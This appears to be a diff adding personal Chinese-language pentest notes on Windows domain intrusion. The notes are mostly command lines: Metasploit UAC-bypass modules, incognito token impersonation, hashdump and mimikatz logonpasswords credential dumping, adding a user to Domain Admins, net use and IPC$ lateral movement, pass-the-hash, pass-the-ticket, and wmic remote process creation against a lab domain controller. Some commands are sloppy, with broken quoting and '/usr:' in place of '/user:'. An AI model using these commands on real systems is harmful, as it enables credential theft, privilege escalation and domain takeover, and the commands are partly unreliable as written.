@@ -1,0 +1,96 @@
+UAC提权（验证账户）
+系统更新、增加或减少账户、更改UAC设置（验证是否为真实用户）
+1、UAC提权
+use exploit/windows/local/bypassuac
+show options--设置
+
+反弹到msf中，spawn--listener(payload windows/foreign/reverse_http、msf:windows/meterpreter/reverse_http)、端口、ip、payload要一致
+
+2、msf中ask提权
+use exploit/windows/local/ask
+show options--set session 1
+通过ASK进行提权
+
+
+令牌窃取
+令牌=token（系统的临时密钥）--类似cookie
+伪造令牌 核心  kerberos协议
+一种是Delegation Tokens，意为授权令牌，它支持交互式登录（比如通过远程桌面登录访问）
+另一种是Impersonation tokens，意为模拟令牌，支持非交互式的会话。
+list_tokens查找出来的令牌数量取决于meterpreter shell的访问级别。
+1、进入session
+use incognito
+list_tokens -u
+授权令牌---模拟令牌---权限越高，能看到的令牌的数量越多
+impersonate_token WINDOWS-TEST1\\test1
+shell
+
+ 纵向移动，配合伪造令牌    
+ 进程迁移--migrate 1880---access is denied
+1、meterpreter中
+run hashdump
+load mimikatz
+(管理员在主机内进行操作，但遗留部分进程没有退出，所以就可以做横向移动到某个进程，以某个用户的名义办事）
+2、在域控中添加用户
+add_user zj Test123! -h 192.168.1.231(服务器ipDC）
+add_group_user "domain admins" zj -h 192.168.1.231(提权到DC）
+3、检查是否提权成功
+net group "domain admins" /domain
+????????
+
+横向移动
+域内主机--获取system权限---成功增加域控管理员
+1、连接域控主机
+net use \\192.168.1.231\c$ "Test123!" /user:zj
+net share
+net use
+dir \\192.168.1.231\c$(查看映射）
+2、另一连接方法（权限更高）
+net use \\192.168.1.231\ipc$ "Test123!" /user:zj
+(条件开启135/445端口，管理员默认设置）
+tasklist /S 192.168.1.231 /U zj /P Test123!(远程访问进程）
+at设置计划任务
+拿到域控之后--横向随便走
+
+mimikatz内网使用
+windows系统散列值获取
+域环境中，用户信息存储在ntds.dit中，加密后为散列值
+LM Hash（des加密，密码设置14位），NTLM Hash（基于md4加密）
+user1：RID：LM-HASH：NT-HASH
+1、kali中输入mimikatz
+找到目标文件夹，将x64打包传到目标主机中
+2、mimikatz "privilege::debug" "log" "sekurlsa::logonpasswords"--adminstrator权限
+（将所有能收集到的密码明文全部输出 2008版本以下）
+
+pass-the-hash（当作cookie使用）
+1、通过mimikatz获得DC的NTLM
+2、域控提权
+mimikatz "privilege::debug" "sekurlsa::pth /usr:administrator /domain:test1.com /ntlm:(粘贴NTLM）
+3、使用aes256 hash
+mimikatz "privilege::debug" "sekurlsa::ekeys"
+mimikatz "privilege::debug" "sekurlsa::pth /usr:administrator /domain:test1.com /aes256:xxxxx"
+弹出一个cmd
+
+票据传递
+kirbi（车票、船票）
+1、进入x86文件夹，导出票据
+mimikatz "privilege::debug" "sekurlsa::tickets /export"
+2、清理内存票据
+kerberos::purge
+3、使用票据
+mimikatz "kerberos::ptt "c:\x64\xxxx.kirbi
+把票据注入到内存中
+
+在本cmd中
+dir \\dc-1\c$
+直接可以访问
+
+
+wmic命令
+1、进入shell
+wmic /node:192.168.1.231 /user:zj /password:Test123! process call create "cmd.exe /c ipconfig > c:\ip.txt"
+
+
+ping 计算机名和ping 计算机ip效果是一样的
+
+工作站
